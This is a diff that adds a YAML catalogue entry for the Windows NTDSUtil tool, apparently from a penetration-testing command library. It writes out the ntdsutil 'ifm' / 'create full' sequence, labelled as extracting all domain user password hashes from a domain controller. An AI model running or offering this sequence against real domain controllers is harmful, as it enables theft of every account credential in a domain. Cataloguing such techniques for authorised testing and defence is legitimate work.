@@ -1,0 +1,21 @@
+---
+name: NT Directory Service Utility (NTDSUtil)
+description: Active Directory domain services management and database/metadata maintenance tool
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Extract All Domain User Password Hashes from Domain Controller":
+    - type: ["cmd","standalone"]
+    - text:
+      - "ntdsutil"
+      - "activate instance ntds"
+      - "ifm"
+      - "create full {FILE}"
+      - "quit"
+      - "quit"
+    - input: ["output folder location"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
